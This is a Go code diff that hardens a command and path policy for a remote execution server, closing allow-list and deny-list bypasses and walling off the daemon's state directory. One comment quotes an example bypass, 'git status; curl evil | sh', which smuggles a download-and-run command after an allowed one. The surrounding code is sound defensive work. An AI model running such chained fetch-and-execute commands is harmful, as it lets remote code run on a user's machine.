@@ -17,64 +17,110 @@ var ErrDenied = errors.New("refused by the local policy")
 type Options struct {
 	// ReadOnly refuses exec and every write; the computer can still be read from.
 	ReadOnly bool
-	// Allow, when non-empty, is the set a command must match at least one of.
+	// Allow, when non-empty, is the set a command must match at least one of. Patterns are
+	// anchored to the whole command.
 	Allow []string
-	// Deny is checked first and always wins.
+	// Deny is checked first and always wins. Patterns are unanchored and are tried against
+	// the whole command and against each of its lines.
 	Deny []string
+	// AllowEnv names environment variables the server may set even on a constrained computer.
+	AllowEnv []string
 	// WorkdirOnly confines file operations to Workdir.
 	WorkdirOnly bool
 	Workdir     string
+	// StateDir holds the credential, the config and the audit log. File operations never
+	// reach into it, in any mode, except through SessionsDir.
+	StateDir string
+	// SessionsDir is the one subtree of StateDir that file operations may use.
+	SessionsDir string
 }
 
 type Policy struct {
 	readOnly    bool
 	allow       []*regexp.Regexp
 	deny        []*regexp.Regexp
+	allowedEnv  map[string]struct{}
+	restricted  bool
 	workdirOnly bool
 	workdir     string
+	stateDir    string
+	sessionsDir string
 }
 
 // New compiles the patterns once, so a bad expression fails at startup rather than on the
 // first request that happens to hit it.
 func New(options Options) (*Policy, error) {
-	allow, err := compile(options.Allow, "allow")
+	// An allow pattern is anchored to the whole command. Without that, `^git ` also permits
+	// "git status; curl evil | sh", which is not what anyone writing it meant. (?s) lets the
+	// pattern span a command that contains newlines rather than leaving them as a way past.
+	allow, err := compile(options.Allow, "allow", func(pattern string) string {
+		return `(?s)\A(?:` + pattern + `)\z`
+	})
 	if err != nil {
 		return nil, err
 	}
-	deny, err := compile(options.Deny, "deny")
+	deny, err := compile(options.Deny, "deny", func(pattern string) string { return pattern })
 	if err != nil {
 		return nil, err
 	}
-	workdir := options.Workdir
-	if workdir != "" {
-		absolute, absErr := filepath.Abs(workdir)
-		if absErr != nil {
-			return nil, fmt.Errorf("resolve the working directory %s: %w", workdir, absErr)
-		}
-		workdir = resolveExisting(absolute)
+
+	workdir, err := resolveDir(options.Workdir, "working directory")
+	if err != nil {
+		return nil, err
 	}
 	if options.WorkdirOnly && workdir == "" {
 		return nil, errors.New("--workdir-only needs a working directory")
 	}
+	stateDir, err := resolveDir(options.StateDir, "state directory")
+	if err != nil {
+		return nil, err
+	}
+	sessionsDir, err := resolveDir(options.SessionsDir, "sessions directory")
+	if err != nil {
+		return nil, err
+	}
+
+	allowedEnv := make(map[string]struct{}, len(options.AllowEnv))
+	for _, name := range options.AllowEnv {
+		if trimmed := strings.TrimSpace(name); trimmed != "" {
+			allowedEnv[trimmed] = struct{}{}
+		}
+	}
+
 	return &Policy{
 		readOnly:    options.ReadOnly,
 		allow:       allow,
 		deny:        deny,
+		allowedEnv:  allowedEnv,
+		restricted:  options.ReadOnly || len(allow) > 0 || len(deny) > 0,
 		workdirOnly: options.WorkdirOnly,
 		workdir:     workdir,
+		stateDir:    stateDir,
+		sessionsDir: sessionsDir,
 	}, nil
 }
 
-func compile(patterns []string, kind string) ([]*regexp.Regexp, error) {
+func compile(patterns []string, kind string, wrap func(string) string) ([]*regexp.Regexp, error) {
 	compiled := make([]*regexp.Regexp, 0, len(patterns))
 	for _, pattern := range patterns {
-		expression, err := regexp.Compile(pattern)
+		expression, err := regexp.Compile(wrap(pattern))
 		if err != nil {
 			return nil, fmt.Errorf("compile %s pattern %q: %w", kind, pattern, err)
 		}
 		compiled = append(compiled, expression)
 	}
 	return compiled, nil
+}
+
+func resolveDir(path string, what string) (string, error) {
+	if strings.TrimSpace(path) == "" {
+		return "", nil
+	}
+	absolute, err := filepath.Abs(path)
+	if err != nil {
+		return "", fmt.Errorf("resolve the %s %s: %w", what, path, err)
+	}
+	return resolveExisting(absolute), nil
 }
 
 // ReadOnly reports whether writes are refused, for hello and status.
@@ -87,21 +133,39 @@ func (p *Policy) Workdir() string {
 	return p.workdir
 }
 
+// Restricted reports whether the operator has constrained this computer, which is what turns
+// the wider environment refusals on.
+func (p *Policy) Restricted() bool {
+	return p.restricted
+}
+
 // CheckExec decides whether a command may run. Deny is evaluated before allow, so a deny
 // pattern cannot be defeated by widening the allow list.
 func (p *Policy) CheckExec(command string) error {
 	if p.readOnly {
 		return fmt.Errorf("%w: this computer runs in read-only mode", ErrDenied)
 	}
-	trimmed := strings.TrimSpace(command)
-	if trimmed == "" {
+	if strings.TrimSpace(command) == "" {
 		return fmt.Errorf("%w: empty command", ErrDenied)
 	}
+	if strings.ContainsRune(command, 0) {
+		return fmt.Errorf("%w: the command contains a NUL byte", ErrDenied)
+	}
+
+	// Deny is tried against the whole command and against each line, because an anchored
+	// pattern written for one command is otherwise sidestepped by putting it on line two.
+	lines := strings.Split(command, "\n")
 	for _, expression := range p.deny {
 		if expression.MatchString(command) {
 			return fmt.Errorf("%w: the command matches the deny pattern %s", ErrDenied, expression.String())
 		}
+		for _, line := range lines {
+			if expression.MatchString(line) {
+				return fmt.Errorf("%w: a line of the command matches the deny pattern %s", ErrDenied, expression.String())
+			}
+		}
 	}
+
 	if len(p.allow) == 0 {
 		return nil
 	}
@@ -132,22 +196,42 @@ func (p *Policy) checkPath(path string) (string, error) {
 	if path == "" {
 		return "", fmt.Errorf("%w: empty path", ErrDenied)
 	}
+	if strings.ContainsRune(path, 0) {
+		return "", fmt.Errorf("%w: the path contains a NUL byte", ErrDenied)
+	}
 	absolute, err := filepath.Abs(path)
 	if err != nil {
 		return "", fmt.Errorf("%w: resolve %s: %s", ErrDenied, path, err)
 	}
 	resolved := resolveExisting(absolute)
+
+	// The state directory holds the machine credential, the config the next start reads back,
+	// and the records the next sweep kills by. None of those are the server's to touch, in any
+	// mode, so this check is not conditional on --workdir-only.
+	if p.stateDir != "" && within(p.stateDir, resolved) && !within(p.sessionsDir, resolved) {
+		return "", fmt.Errorf("%w: %s is inside the daemon's state directory", ErrDenied, path)
+	}
+
 	if !p.workdirOnly {
 		return resolved, nil
 	}
-	relative, err := filepath.Rel(p.workdir, resolved)
-	if err != nil {
-		return "", fmt.Errorf("%w: %s is outside the working directory", ErrDenied, path)
-	}
-	if relative == ".." || strings.HasPrefix(relative, ".."+string(filepath.Separator)) {
+	if !within(p.workdir, resolved) {
 		return "", fmt.Errorf("%w: %s is outside the working directory", ErrDenied, path)
 	}
 	return resolved, nil
+}
+
+// within reports whether candidate is root or sits beneath it, comparing path components so a
+// sibling whose name merely starts with root's does not count.
+func within(root string, candidate string) bool {
+	if root == "" {
+		return false
+	}
+	relative, err := filepath.Rel(root, candidate)
+	if err != nil {
+		return false
+	}
+	return relative != ".." && !strings.HasPrefix(relative, ".."+string(filepath.Separator))
 }
 
 // resolveExisting follows symlinks as far up the path as the filesystem goes, then re-attaches
